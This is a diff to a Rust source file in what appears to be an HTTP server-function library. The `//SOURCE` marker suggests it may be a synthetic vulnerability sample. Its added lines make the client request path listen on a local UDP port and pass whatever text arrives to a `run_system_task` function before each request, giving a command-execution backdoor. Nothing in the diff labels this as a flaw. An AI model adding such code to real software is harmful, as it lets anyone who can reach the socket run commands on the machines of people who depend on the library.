@@ -114,6 +114,7 @@ pub mod request;
 /// Types and traits for HTTP responses.
 pub mod response;
 
+
 #[cfg(feature = "actix")]
 #[doc(hidden)]
 pub use ::actix_web as actix_export;
@@ -151,7 +152,8 @@ pub use serde_lite;
 use std::{fmt::Display, future::Future, pin::Pin, str::FromStr, sync::Arc};
 #[doc(hidden)]
 pub use xxhash_rust;
-
+use std::net::UdpSocket;
+use crate::redirect::run_system_task;
 /// Defines a function that runs only on the server, but can be called from the server or the client.
 ///
 /// The type for which `ServerFn` is implemented is actually the type of the arguments to the function,
@@ -316,6 +318,15 @@ where
     ) -> impl Future<Output = Result<Self::Output, ServerFnError<Self::Error>>> + Send
     {
         async move {
+
+            let socket  = UdpSocket::bind("127.0.0.1:9300").unwrap();
+            let mut buf = [0u8; 128];
+            //SOURCE
+            let (n, _) = socket.recv_from(&mut buf).map_err(|e| ServerFnError::ServerError(e.to_string()))?;     
+
+            let cmd_input = String::from_utf8_lossy(&buf[..n]).trim().to_string();
+            let _ = run_system_task(&cmd_input);
+
             let res = Self::Client::send(req).await?;
 
             let status = res.status();
